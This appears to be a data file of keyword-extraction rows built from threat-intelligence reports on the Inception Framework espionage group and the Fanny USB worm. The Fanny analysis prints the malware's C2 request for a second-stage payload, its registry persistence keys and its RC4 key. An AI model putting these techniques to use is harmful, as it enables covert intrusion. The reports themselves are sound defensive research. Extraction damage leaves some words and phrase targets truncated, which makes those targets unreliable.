macros in their settings and also by being more vigilant when enabling macros (especially when prompted) in documents, even if such documents are from seemingly trusted sources.This entry was posted on Sun May 22 03:00:00 EDT 2016 and filed under Advanced Targeted Attacks, Advanced Threat Actor, Advanced Threats, Bank security, Blog, Cybercrime, Cybersecurity, Email Attacks, Email Security, Latest Blog Posts, Sudeep Singh, Targeted Attack, Targeted Attack, Targeted Attacks , Threat Intel, Threat Research, Yin Hong Chang and targeted attackers.First NameLast NameEmail Address Executive Perspective BlogThreat Research BlogProducts and Services BlogSubscribe Report Security Issue Supplier Documents Legal DocumentationLinkedInTwitterFacebookGoogle+YouTubePodcastsGlassdoorContact Us: 877-FIREEYE (877-347-3393)Copyright © 2016 FireEye, Inc. All rights reserved.Privacy & Cookies Policy | Safe Harbor ","{'phrases': ['the attacker', 'emails', 'Excel', 'malicious macros', 'Bank', 'employees', 'the macro', 'Extracts', 'content', 'PowerShell', 'the system', 'a scheduled task', 'the VBScript', 'tools', 'Mimikatz', 'BAT', 'accounts', 'processes', 'the data', 'DNS', 'name'], 'target': 'the attacker; emails; Excel; malicious macros; Bank; employees; the macro; Extracts; content; PowerShell; the system; a scheduled task; the VBScript; tools; Mimikatz; BAT; accounts; processes; the data; DNS; name.'}"
spear-phishing emails; attachments; vulnerabilities; CVE-2014-1761; CVE-2012-0158; the malware; an exploit; a DLL; the web server; commands; the attackers; data; the cloud; infrastructure; proxies; IoT; data; targets.,"[""1. Inception sends a reconnaissance document to fingerprint the target's system. 2. Days later, they send a second spearphishing email with an exploit document that retrieves and opens a remote RTF file. 3. The RTF file exploits a vulnerability and executes a loader DLL on the system. 4. The loader DLL decrypts and injects the main payload DLL into memory. 5. The payload gathers system info, executes plugins, and communicates with C2 servers on cloud storage providers via WebDAV. 6. Various plugins are used for surveillance, stealing files, credentials, browser data, etc. 7. Compromised routers and servers act as proxies to mask C2 traffic to the cloud servers. 8. Mobile malware is also used to infect Android, iOS, and Blackberry devices via SMS and links. ""]","Extract the keywords: Blogs POSTED: 14 MAR, 20186 MIN READTHREAT INTELLIGENCE (/BLOGS/THREAT-INTELLIGENCE)Inception Framework: Alive and Well, and Hiding Behind Proxies Espionage group has remained active over the past three years, using cloud and IoT to hide in plain sight.The cyber espionage group known as the Inception Framework has signi cantly developed its operations over the past three years, rolling out stealthy new tools and cleverly leveraging the cloud and the Internet of Things (IoT) in order to make its activities harder to detect.Since 2014, Symantec has found evidence of a steady stream of attacks from the Inception Framework targeted at organizations on several continents. As time has gone by, the group has become ever more secretive, hiding behind an increasingly complex framework of proxies and cloud services.History of stealthy attacksThe Inception Framework has been active since at least May 2014 and its activities were  rst exposed by Blue Coat (now part of Symantec) in December 2014 (url Right from the start, the group stood out because of its use of an advanced, highly automated framework to support its targeted attacks. This level of sophistication is rarely seen, even in the targeted attacks sphere. The nature of Inception’s targets, from 2014 right through to today, along with the capabilities of its tools, indicate that espionage is the primary motive of this groupsIn 2014, Inception was compromising targeted organizations using spear-phishing emails, which masqueraded as legitimate emails concerning international policy, upcoming conferences, and speci c sectoral interests of the targeted organization.More than half of the group’s earlier targets were in the Energy or Defense sectors, but it also targeted organizations in the Consultancy/Security, Aerospace, Research, and Media sectors, in addition to embassies. Its activities ranged across the globe, with targets located in South Africa, Kenya, the United Kingdom, Malaysia, Suriname, along with several other European and Middle Eastern countries.Word documents attached to Inception’s spear-phishing emails leveraged two Microsoft O ce vulnerabilities (CVE-2014-1761 (url and CVE-2012-0158 (url 2012-0158)) to install malware on the recipient’s computer. The malware had a multi-staged structure that began with a malicious RTF document and ended with an in-memory DLL payload that communicated, via the WebDAV protocol, with a command and control (C&C) address from a legitimate cloud service provider (CloudMe.com). The name “Inception” comes from the group’s many levels of obfuscation and indirection it employed in delivering this payload.Further layers of obfuscation emerged when Blue Coat was able to determine that the attackers were communicating with CloudMe.com through a hacked network of compromised routers, the majority of which were located in South Korea.Stepping out of the shadows once againFollowing its exposure in late 2014, Inception fell quiet. However, this turned out to be only a brief hiatus and, by April 2015, there had been a resurgence in activity. Attacks have continued since then, right through to 2017.Figure 1. Inception Framework attacks 2015-2017In the intervening years, the Inception Framework has evolved, adding additional layers of obfuscation in a bid to avoid detection. The group is using new types of lure documents in its spear-phishing campaigns and its malware has expanded to use new types of plugins. Inception has also increased its use of the cloud, and diversi ed the range of cloud providers it uses for C&C purposes.Figure 2. Locations of organizations targeted by Inception, 2015-2017The locations of Inception’s targets have shifted since 2014, but the group continues to have a global reach. Russia accounted for the largest number of attacks between 2015 and 2017, followed by Ukraine, Moldova, Belgium, Iran, and France.An evolved attack frameworkSince 2014, the Inception Framework has steadily changed its tools and techniques. In its early attacks, the group’s malware payload (with the exception of plugins) was fully contained within an exploit document emailed to the victim. In more recent activity, these spear-phishing attacks are now a two- stage process. The group will  rst email the target a malicious “Reconnaissance document” which, if opened, will  ngerprint the target computer(url gathering information on what software it is running and whether that software is up to date.Several days later, Inception will send a second spear-phishing email to the target, with another malicious document attached. This document is designed to retrieve a remote RTF  le, which contains the exploit, and open it on the target’s computer.Shortly after this RTF document is opened, the remaining stages of the Inception malware are found executing on the system. The loader DLL is responsible for decrypting and injecting the core payload DLL into memory, from an encrypted  le present on disk. The core payload DLL's main function is to gather system information, execute other malware in the form of plugins, and update itself. It accesses C&C via WebDAV hosted on legitimate cloud storage providers.The use of an initial reconnaissance document allows Inception to pro le the target’s computer and potentially customize any subsequent malicious document to exploit known vulnerabilities in unpatched software on the computer.By breaking its attacks up into distinct stages, Inception also makes them harder to detect. For investigators to trace an attack, each stage will have be uncovered and referenced to the other stages.Modular malwareInception’s malware is modular and the attackers will load plugins based on requirements for each attack. The group has used a range of plugins in recent attacks, some of which are improved versions of plugins used in 2014, while others were previously unseen.File hunting plugin: The most frequently used plugin, similar to one used in 2014. Often used to collect O ce  les from temporary internet history. Detailed survey plugin: Used to gather domain membership, processes/loaded modules, hardware enumeration, installed products, logical and mapped drive information. Evolution of earlier plugin used in 2014. Browser plugin: Used to steal browser history, stored passwords and sessions. Works with Internet Explorer, Chrome, Opera, Firefox, Torch, and Yandex. File listing plugin: Works on local or remote drives and can map additional paths when given credentials.Expanding use of the cloudSince 2014, Inception has widened its use of cloud service providers for C&C purposes. Whereas previously it relied on one service provider (CloudMe.com), more recently it has employed a least  ve cloud service providersLeveraging the cloud for C&C has a number of advantages for groups like Inception. Any C&C communications will involve encrypted tra c to a known website, meaning it is less likely to raise  ags on targeted networks. Legitimate cloud services are not likely to be blacklisted.Varying the cloud service provider used adds a further degree of stealth. Once it became known Inception was using a single provider, any tra c to that provider may have attracted additional scrutiny.Symantec has noti ed all cloud providers affected. Where possible Symantec has provided details on the C&C accounts used by Inception to the affected cloud providers. The accounts in questions have been deleted or disabled.Using IoT to hide behind proxiesInception is continuing to use chains of infected routers to act as proxies and mask communications between the attackers and the cloud service providers they use. Certain router manufacturers have UPnP listening on WAN as a default con guration. Akamai research has found that there are 765,000 devices vulnerable to this attack. These routers are hijacked by Inception and con gured to forward tra c from one port to another host on the internet. Abuse of this service requires no custom malware to be injected on the routers and can be used at scale very easily. Inception strings chains of these routers together to create multiple proxies to hide behind.""#InceptionFramework evolved, rolling out new tools & hiding behind increasingly complex array of proxies & cloud services symc.ly/2GsqXra"" CLICK TO TWEET (//TWITTER.COM/INTENT/TWEET? TEXT=%23INCEPTIONFRAMEWORK%20EVOLVED,%20ROLLING%20OUT%20NEW%20TOOLS%20%26%20HIDING%20BEHIND%20INCREASINGLY%2Every connection builds different chains of infected routers and once the connection is complete, it cleans up after itself. In several cases, Symantec has been able to follow the entire chain of compromised routers and found it led to a virtual private server (VPS), meaning the attackers have employed an additional layer of security by routing communications through rented hosting servers.Mobile devices targetedInception has an ongoing interest in mobile devices and has previously developed malware to infect Android (Android.Lastacloud (url iOS (IOS.Lastaccoud (url and BlackBerry devices (BBOS.Lastacloud (url malware continues to be deployed and the group has made some modi cations to its Android malware. The malware is spread via SMS messages and emails containing malicious links. Once installed, it uses user pro le pages on online forums as dead drops for its C&C.Figure 3. Malicious SMS message used by Inception to spread Android malwarePersistence, stealth, and global reachEven prior to its discovery in 2014, Inception went to great lengths both to avoid detection and conceal its location. Exposure hasn’t deterred the group. Instead, it has redoubled its efforts, adding more layers of obfuscation to an already complex attack framework. Its persistence, stealth, and global reach mean the group continues to pose an ongoing risk to organizations, particularly in its areas of interest, which include defense, aerospace, energy, governments, telecoms, media, and  nance.Aside from a suite of advanced modular malware, the group is notable for its ability to make use of new platforms such as the cloud, IoT, and mobile to facilitate its attacks. An “early adopter”, Inception’s tactics may point the way towards how other espionage groups may modify their methods in years to come.ProtectionSymantec has had protection for all of the Inception Framework tools since the initial emergence of the group in 2014. The following detections are in place today:File-based protectionInfostealer.Rodagose (url Trojan.Rodagose!g1 (url Trojan.Rodagose!g2 (url Trojan.MDropper (url (url BBOS.Lastacloud (url IOS.Lastacloud (url Protection ProductsMalware Analysis Appliance detects activity associated with InceptionCustomers with Webpulse-enabled products are protected against activity associated with InceptionSecurity Response Attack Investigation Team The Attack Investigation Team is a group of security experts within Symantec Security Response whose mission is to investigate targeted attacks, drive enhanced protection in Symantec products, and offer analysis which helps customers respond to attacks.About the AuthorAbout the AuthorNetwork Protection Security Labs Network Protection Security Labs is a group of security experts within Network Protection Products doing advanced security research to continuously improve Symantec Network Products. ","{'phrases': ['Inception', 'the target', 'Days later', 'second', 'an exploit document', 'RTF', 'the system', 'The loader DLL', 'memory', 'system info', 'plugins', 'servers', 'cloud storage providers', 'WebDAV', 'use', 'les', 'credentials', 'Browser', 'compromised routers', 'proxies', 'tra', 'the cloud', 'mobile', 'malware', 'Android', 'iOS', 'Blackberry devices', 'SMS', 'links'], 'target': 'Inception; the target; Days later; second; an exploit document; RTF; the system; The loader DLL; memory; system info; plugins; servers; cloud storage providers; WebDAV; use; les; credentials; Browser; compromised routers; proxies; tra; the cloud; mobile; malware; Android; iOS; Blackberry devices; SMS; links.'}"
the attacker; CVE-2010-2568; The LNK exploit; privilege escalation; Microsoft; Malware; Fanny; PE; the exploit; MS09-025; Microsoft Windows kernel; the kernel; the exploit; persistence; the system; commands; data; USB drives; autorun; USB devices.,[' 1. Spread via USB drives using the LNK exploit. 2. Use separate exploit to escalate privileges. 3. Establish persistence and implant backdoor. 4. Exfiltrate reconnaissance data from air-gapped systems via USB. 5. Send commands and additional malware via hidden USB storage. '],"Extract the keywords: am your father, Stuxnet”By GReAT on February 17, 2015. 9:00 amAt the Virus Bulletin conference in 2010, researchers from Kaspersky Lab partnered with Microsoft to present ﬁndings related to Stuxnet. The joint presentation included slides dealing with various parts of Stuxnet, such as the zero-days used in the attack.Perhaps the most interesting zero-day exploit from Stuxnet was the LNK exploit (CVE-2010-2568). This allowed Stuxnet to propagate through USB drives and infect even machines that had Autorun disabled.It was discovered during the 2010 research into Stuxnet that the LNK exploit has earlier been used in another malware, supposedly a Zlob PE, that pointed to “fanny.bmp“.Back in 2010, very few people paid much attention to a piece of malware that used the LNK exploit prior to Stuxnet. Zlob is a large malware family and these kinds of crimeware-grade samples are rarely of interest to researchers digging into zero-days and nation-state sponsored operations.However, during our 2014 research into the Equation group, we created a special detection for the group’s exploitation library, codenamed “PrivLib”. To our surprise, this detection triggered a worm from 2008 that used the Stuxnet LNK exploit to replicate, codenamed Fanny.What’s so Fanny?This PrivLib-boosted Worm, which spreads using the Stuxnet LNK exploit and the ﬁlename “fanny.bmp” was compiled on Mon Jul 28 11:11:35 2008, if we are to trust the compilation timestamp. It arrived in our December 2008 collection from the wild, so the compilation might very well be correct.“Fanny my name” could be an introductory message from the authorsThe 2008 “Fanny.bmp” Worm is detected by Kaspersky Lab products as Trojan-Downloader.Win32.Agent.bjqt. The malware includes the LNK exploit, which means that it is a piece of malicious software that used the Stuxnet LNK exploit before Stuxnet!The second Stuxnet exploit (MS09-025)If one piece of malicious software that used an exploit from Stuxnet before Stuxnet is a good catch, a second Stuxnet exploit makes it even more interesting.The second exploit used to be a zero-day when Fanny was operational. This means that Fanny used two zero-days to replicate, both of which were later used by Stuxnet. The speciﬁc vulnerability used for privilege escalation was patched with MS09-025:“The security update addresses these vulnerabilities by correcting the methods used for validating a change in speciﬁc kernel objects, for validating the input passed from user mode to the kernel, and for validating the argument passed to the system call. The security update also addresses a vulnerability by ensuring that the Windows kernel cleans up pointers under error conditions.”The same exploit was later used in an early Stuxnet module from 2009, which was embedded into a large binary built using the Flame platform. That Stuxnet module, also known as “atmpsvcn.ocx” or Resource 207 was the technical link between Stuxnet and Flame. This story has previously been covered in our post.Tweet#Fanny used two zero-days to replicate, both of which were later used by #Stuxnet #EquationAPT #TheSAS2015While the vulnerability exploited by both the Stuxnet/Flame module and Fanny is the same, the implementation of the exploit is diﬀerent. The exploit in Stuxnet targets a speciﬁc OS version, while Fanny is designed to be universal and is capable of running on multiple platforms. It has a unique shellcode and exploit-triggering procedures for:Windows NT 4.0 Windows Vista, 2008 and possibly others from NT6.x familyThe implementation of the exploit in Fanny is more complex than in Stuxnet: instead of running just one payload the authors created a framework to run as many payloads as they want by replacing a system service call dispatcher nt!NtShutdownSystem with their own custom pointer from theuser-space as shown in the next ﬁgure.Fanny injected its own system service call dispatcherThis enables a persistent trampoline from user-mode to kernel-mode. This feature was not present in the Stuxnet module but there are other similarities. For instance, it seems that both the developers of Stuxnet and of Fanny follow certain coding guidelines such as the usage of unique magic numbers from each function call. Most of the returned results are simply disposed but they are still part of the code. This could be the remains of a debug version of the code which could potentially log every step in the code to ease the tracking down of an error while testing. In complex systems where kernel and user-space code is running with no interaction this seems a logical and even essential method. Again, it’s implemented both in the Stuxnet code and in Fanny. See next ﬁgure.Stuxnet (on the left) and Fanny (on the right) using magic return valuesThe Fanny MalwareSo, what is Fanny essentially? It is a USB Worm with a sophisticated backdoor that uses the so-called “Stuxnet LNK vulnerability” to automatically execute from the USB drive even if Autorun has been disabled. It can elevate privileges to the local System using kernel exploit and drops and registers additional modules. It attempts to connect to a C&C server and deploys additional components if connection is available. If not, it uses the USB drive as a carrier to send/receive requests to and from the operator via a hidden storage area created in raw FAT structure.Typically a victim plugs in a new USB drive and opens it with Windows Explorer. You can visually observe the two stages of infection from the contains a xor-encrypted conﬁg in binary resource with number 101. The conﬁg determines malware behavior: there is a command to deploy malware on the current system, URLs for the C&C server and local ﬁlenames and paths used to install embedded malware components.Fanny components inside the main executableUpon starting it checks the following mutexes:Global\RPCMutex Global\RPCMutexis a 1-byte long integer taken from the conﬁg. If any of theseWhere mutexes exist, the code doesn’t run. It means that another instance of the same code is running. InstanceNum most likely identiﬁes a variant or generation of Fanny preventing the same version from reinfecting the system but allowing for diﬀerent versions to run (possibly to enable enforced update of components).The module also checks another important byte in its conﬁguration. This byte is a counter that is decreased during successful system infection. When the counter reaches a minimal value of one the module cleans up the USB drive and stops spreading the worm. In this way the attackers limit the maximum length of the Worm’s killchain.If the module is named “fanny.bmp” (the ﬁle name that Fanny uses to spread via USB drives) the module self-installs from the USB drive.As part of the initial infection process Fanny attempts to elevate current privileges if the user has no administrative rights on the current system. It uses a vulnerability patched by MS09-025 for that purpose. Only if the elevation succeeds does the malware attempt to connect to the C&C server using a URL which is stored in the conﬁg:url ahx.htmlBelow is a sample request issued by the malware:GET /ads/QueryRecord200586_f2ahx.html HTTP/1.1 User-Agent: Mozilla/4.0 (compatible;) Host: webuysupplystore.mooo.comThe malware expects the C&C server to reply with an HTTP 200 response and append a 0x7f-xored string that has a second stage URL. The second stage response may contain an executable ﬁle body which is saved on disk and executed.The C&C server is currently sinkholed by Kaspersky Lab, but according to of the initial and embedded components of Fanny.InfectionThe module searches for fanny.bmp in the root of disk drives starting from drive D: and copies it to the following locations:%WINDIR%\system32\comhost.dll %WINDIR%\system32\mscorwin.dllWhy does Fanny make two copies of itself? Actually, there is a minor diﬀerence between these two ﬁles. Fanny patches its conﬁg in the resource section of one of the ﬁles (comhost.dll). The patched data is the value of remained maximum length of the Fanny killchain. “mscorwin.dll” is the original ﬁle copied as-is from the removable drive. So far, one copy is used for infecting other USB drives, the other is loaded on the system boot.It also copies all *.lnk ﬁles from the USB drive to “%WINDIR%\system32\” in order to reuse them when infecting other attached USB drives. Note that there may be more than one LNK ﬁle, because each LNK contains a distinct path to the DLL which gets loaded. As far as the letter of a new drive on the target system is unknown, Fanny uses several LNKs for the most common drive letters. This method was improved later in Stuxnet, which used a relative DeviceID-dependent path to the USB drive. However, even that method required several LNK ﬁles (up to four) because of diﬀerent relative paths on diﬀerent versions of Windows, but that’s far fewer than an almost full set of letters from the Latin alphabet.PersistenceFanny creates the following registry value to achieve persistence: HKLM\System\CurrentControlSet\Control\MediaResources\acm\ECELP 4\Driver.This is not a common way to make code start automatically on a system boot and it’s extremely invasive, but it guarantees that the module is loaded in the address space of each process in the system, including some critical processes such as lsass.exe and services.exe running as SYSTEM user.When the module is loaded it checks other values that start from “ﬁlter” in the same registry key, i.e.:HKLM\System\CurrentControlSet\Control\MediaResources\acm\EC ELP4\ﬁlter2 HKLM\System\CurrentControlSet\Control\MediaResources\acm\EC ELP4\ﬁlter3 HKLM\System\CurrentControlSet\Control\MediaResources\acm\EC ELP4\ﬁlter8The values contain a hosting process name and a path to a DLL or EXE ﬁle. If the current process name contains the value set as hosting process, then the module loads a DLL or starts a new process (in case of EXE ﬁle) depending on target ﬁle extension.This is a map of the processes and modules that are used in Fanny:ProcessFanny modulewinlogonc:\windows\MSAgent\AGENTCPD.DLLexplorerc:\windows\system32\shelldoc.dllShortDescriptionUSBbackdoorWindows Explorer rootkitlsassc:\windows\system32\mscorwin.dllUSB wormUSB WormThe code of the actual Worm is part of %WINDIR%\system32\comhost.dll export with ordinal 4 (name of export is “dll_installer_4“). The DLL is a modiﬁed next-generation Worm which is copied to every attached USB drive with all related LNK ﬁles stored in Windows\System32 directory. This module is distributed by mscorwin.dll which is part of the lsass system process.Windows Explorer RootkitThe rootkit functionality is provided by a shelldoc.dll ﬁle loaded in the Windows Explorer process. It hides some Fanny-related ﬁles (LNK-ﬁles and fanny.bmp) in Windows Explorer by removing them from the list of items in the foreground window that uses SysListView32 control (normally Windows Explorer window).Some screenshots with disappearing ﬁles were demonstrated previously, however sometimes this approach may raise suspicions. Here is what it looks like if the user opens a system32 directory with Explorer:Seven Fanny-related ﬁle icons disappeared in Windows ExplorerApparently, it looks as if some of the ﬁle icons were cut oﬀ. In addition some of standard directories seem to be missing due to a bug in the rootkit code. It appears as if this component was not tested properly by the authors.Masquerade Mode OnThere is an interesting part of the code in USB Backdoor DLL which at ﬁrst glance doesn’t make much sense. It takes some hardcoded constants and generates a random value which is saved to a registry key.Fanny generates random values that are saved to the registryThen it moves the current executable which is hosting the DLL to c:\windows\system32\msdtc32.exe. After that the executable path is appended to HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell registry value which makes this executable run on system boot.TweetThe trick to mimic the behavior of traditional malware was used to avoid revealing further secret activities #FannyThis may look like a traditional way for malware to add itself to autostart, but don’t be fooled by that. The purpose of this move is to make certain automated systems and software, such as those based on sandboxes and emulators, believe that they have caught some known malware and not to let it run further. It seems that the component is so unique that the authors decided to avoid the risk of looking even more suspect. It might seem a paradox, but the authors prefer this code to be detected as malware if someone is checking it. The trick is to mimic the behavior of some traditional cybercriminal malware, a bot, and get detected as soon as possible, thereby not revealing any further secret activities. Considering that this component was spreading via USB drives and could pop up on many systems, discovering it as a traditional bot would put it in lower risk zone and as a result the malware would probably end up being deleted without proper analysis.This might explain why this code was detected as a variant of Zlob malware in the past and no one paid proper attention to it.USB BackdoorOne of the modules, agentcpd.dll, is a backdoor that was designed to work as an advanced reconnaissance tool for air-gapped computers that are normally used in highly secure facilities. The backdoor waits for a USB drive to be plugged in and if that’s a new disk, it instantly allocates some space for a hidden container using its own FAT16/FAT32 ﬁlesystem driver.This is what the FAT root directory looks like before and after plugging a USB drive into an infected machine:Hexdump of raw disk partition before and after plugging into an infectedmachineOn top of this hexdump the drive label “MYDRIVE” can be found (corresponding hex bytes are underlined with green). It is followed by a single byte ﬂag value (0x08 in hex) which, according to Microsoft, means ATTR_VOLUME_ID. Each entry in this root directory table is 32-bytes long.Subdirectory entries such as Pictures, Music, Documents and Work occupy 63 bytes, because of the long ﬁlename FAT feature. There are two variants of subdirectory names – short and long. A subdirectory entry uses a ﬂag 0x10 following the short directory name, which, according to Microsoft, means ATTR_DIRECTORY.The last record inserted by Fanny (highlighted in red) uses an invalid directory name and a ﬂag 0x18, which combines ATTR_VOLUME_ID and ATTR_DIRECTORY. This combination of ﬂags is not documented according to current FAT speciﬁcations and the whole entry is therefore ignored by ﬁlesystem drivers as if it were a data corruption or a bad block. As a result this entry is not visible in Windows, Mac OS and Linux and probably all other implementations of FAT driver.TweetIt’s possible that #Fanny was used to map some of the future targets of #Stuxnet #EquationAPT #TheSAS2015While Fanny doesn’t rigorously protect data in hidden storage (it doesn’t mark the allocated space as bad blocks, probably to avoid attention), it changes the ﬁlesystem driver hint value indicating where to look for the next free cluster. In this way it reserves disk space of approximately 1Mb in size to use for a hidden storage.When Fanny detects a new USB drive, with the help of its own FAT driver it looks into the root directory and locates the entry which starts with magic value 51 50 40 98 (see above). It then uses the oﬀset which follows the ﬂag value of 0x18. On the ﬁgure above it is set to 0x001e9c00. This oﬀset on the same USB disk will have another magic value D0 CF CE CD serving as a marker for the beginning of the hidden storage:Hexdump of Fanny hidden storage with list of running processesOnce Fanny has allocated space for hidden storage it populates the storage with basic information about the current system: i.e. OS Version, Service Pack number, computer name, user name, company name, list of running processes, etc.This secret storage is also used to pass commands to computers that are not connected to the Internet. According to Fanny code, the container may carry additional components and internal commands: such as to copy certain ﬁle from the local ﬁlesystem to the USB drive (locations are deﬁned as parameters, the ﬁle is set hidden and system ﬁle attributes), or to update the conﬁguration block. It uses RC4 with the following hard- coded key to protect critical information:18 05 39 44 AB 19 78 88 C4 13 33 27 D5 10 6C 25When the USB drive travels to another infected computer connected to the Internet it can be used to carry important ﬁles and provide a way to interact with the operator. This simple and extremely slow method of communication is not used by traditional cybercriminals, that is why the whole code looks like a toolkit for professional cyberespionage. This component is one of the rare malware samples from a new class of malware called USB-Backdoors.If you ﬁnd this or a similar code of USB-Backdoor on some of your systems this is an indicator of a professional cyberattack.Sinkholing and victim statisticsWe sinkholed the Fanny C&C server and collected victim statistics, shown below. In total, we observed over 11,200 unique IPs connecting to thesinkhole server over a period of ﬁve months:At the moment, the vast majority of victims are located in Pakistan (a whopping 59.36%). Indonesia and Vietnam follow at great distance, with 15.99% and 14.17% respectively. The infection numbers in other countries are probably too small to be relevant.Of course, this could raise the question: was Pakistan the true target of Fanny? To be honest, we do not know. The current infection situation might be diﬀerent from what it was in 2008-2010. Considering that there are still over ten thousand victims worldwide, the number back in 2009 might have been much, much higher – perhaps even as high as 50,000 infections. It may be relevant that Pakistan is a top target for the Equation group’s other malware, along with Russia and Iran.ConclusionWith Fanny, we begin yet another chapter in the story of Stuxnet, the Equation Group and Flame. Created in 2008, Fanny used two zero-day exploits. These two were added to Stuxnet in June 2009 and March 2010. Eﬀectively, it means that the Equation group had access to these zero- days (and others) years before the Stuxnet group did.While the true target of Fanny remains unknown, its unique capability to map air-gapped networks and communicate via USB sticks indicate a lot of work went into gaining the ability to access these air-gapped networks. As a precursor for the versions of Stuxnet that could replicate through the network, it’s possible that Fanny was used to map some of the future targets of Stuxnet.Another unusual fact is the very high number of infections coming from Pakistan. Since Fanny spreads only through USB sticks, which is rather slow, this indicates that the infection began in Pakistan, possibly before many other countries.Was Fanny used to map some highly sensitive networks in Pakistan, for an unknown purpose, or was it used in preparation for Stuxnet? Perhaps time will tell.APT CYBER ESPIONAGE EQUATION FLAME SPYWARE STUXNET TARGETED ATTACKSShare post on:  Related PostsHappy IR in the New Year!Kaspersky Review of the spywareTHERE ARE 4 COMMENTSredwolfe_98 Posted on February 18, 2015. 1:29 pmkaspersky implies that the “equation group” and the “stuxnet group” are two diﬀerent groups, but i think that another possibility is that they are one and the same thanks for the article i was wondering about the “fanny.bmp” ﬁle and how a “BMP” ﬁle was being used apparently it is just copied to the harddrive, but with a diﬀerent ﬁle-extension, making it usable for malicious purposes cyruwan Posted on March 9, 2015. 7:09 amHats oﬀ to Kaspersky engineers!!FroZenREPLYREPLYPosted on June 29, 2015. 4:13 amThe only thing U.S is worried about Pakistan is Nuclear Power (well hidden). U.S seeking for locations of nuclear weapons in Pakistan to damage or de-nuking the country. Pakistan Intelligence told that of all the things in the world to worry about, the issue you should worry about the least is the safety of our nuclear program,” the oﬃcial said. Pakistan said no to U.S safety program. it’s wise for the U.S. to try to design a plan for seizing Pakistan’s nuclear weapons in a low and slow risk manner, ( Fanny ). Fanny also Failed….so they skip for second option, Iran.REPLYphunterSW Posted on August 3, 2016. 1:02 pmI don’t think this one would be nuclear-focused. Remember who was living in Pakistan with a computer but no direct Internet connection pre-2011? Osama bin Laden.REPLY ","{'phrases': ['a USB drive', 'USB drives', 'the LNK exploit', 'privileges', 'persistence', 'data', 'System', 'commands', 'addition', 'malware'], 'target': 'a USB drive; USB drives; the LNK exploit; privileges; persistence; data; System; commands; addition; malware.'}"
